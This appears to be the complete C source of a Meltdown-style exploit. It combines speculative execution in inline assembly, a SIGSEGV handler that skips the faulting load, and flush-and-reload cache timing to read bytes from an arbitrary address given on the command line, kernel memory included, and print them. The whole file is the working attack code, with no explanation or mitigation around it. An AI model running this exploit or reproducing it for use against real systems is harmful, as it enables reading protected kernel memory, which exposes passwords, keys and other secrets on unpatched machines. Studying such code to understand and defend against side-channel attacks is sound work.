#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <x86intrin.h>
#define PAGE_SIZE 4 * 1024
#define ARRAY_SIZE 256

static char target_array[ARRAY_SIZE * PAGE_SIZE];
static int check_array[ARRAY_SIZE];
int cache_threshold;

static inline int get_access_time(volatile char *addr)
{
unsigned long long time1, time2;
int zero=0;
time1 = __rdtscp(&zero);
(void)*addr;
time2 = __rdtscp(&zero);
return time2 - time1;
}

void clflush()
{
	int i;
	for (i = 0; i < ARRAY_SIZE; i++)
		_mm_clflush(&target_array[i * PAGE_SIZE]);
}

extern char stopspeculate[];

static void __attribute__((noinline)) speculate(unsigned long addr){
	asm volatile (
		".rept 500\n\t"
		"add $0x456, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}
void check(){
	int i, time;
	volatile char *addr;
	for (i = 0; i <ARRAY_SIZE; i++) {
		addr = &target_array[i * PAGE_SIZE];
		time = get_access_time(addr);
		if(time*time<cache_threshold)
			check_array[i]++;
	}
}

int readbyte(int fd, unsigned long addr, int count)
{
	int i,max = -1, max_i = 0;
	static char buf[256];
	memset(check_array, 0, sizeof(check_array));
	for (i = 0; i < 1000; i++) {
		max_i = pread(fd, buf, sizeof(buf), 0);
		if (max_i < 0) {
			perror("pread");
			break;
		}
		clflush();
		speculate(addr);
		check();
	}

	for (i = 1; i < ARRAY_SIZE; i++) {
		if (check_array[i] && check_array[i] > max) {
			max = check_array[i];
			max_i = i;
		}
	}
	if(max_i==-1)
	return 0;
	return max_i;
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	return;
}

int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}
void set_cached_threshold(void)
{
	long cached,uncached;
	int i;
	for (uncached = 0, i = 0; i < 10000; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}
	for (cached = 0, i = 0; i < 10000; i++)
		cached += get_access_time(target_array);
	for (cached = 0, i = 0; i < 10000; i++)
		cached += get_access_time(target_array);
	cached /= 10000;
	uncached /= 10000;
	cache_threshold=cached*uncached;
}
int main(int argc, char *argv[])
{
	int i, ret;
	int fd;
	unsigned long addr;
	int size=10;
	static char record[200];
	sscanf(argv[1], "%lx", &addr);
	sscanf(argv[2], "%dx", &size);
	ret=set_signal();
	memset(target_array, 1, sizeof(target_array));
	set_cached_threshold();
	fd = open("/proc/version", O_RDONLY);
	for (i = 0; i < size; i++)
	{
		ret = readbyte(fd, addr,0);
		printf("read:%lx data=%2x %c\n", addr, ret,isprint(ret)?ret:' ');
		record[i]=isprint(ret)?ret:' ';
		addr++;
	}
	printf("ALL information:\n%s\n",record);
	close(fd);
	return 0;
}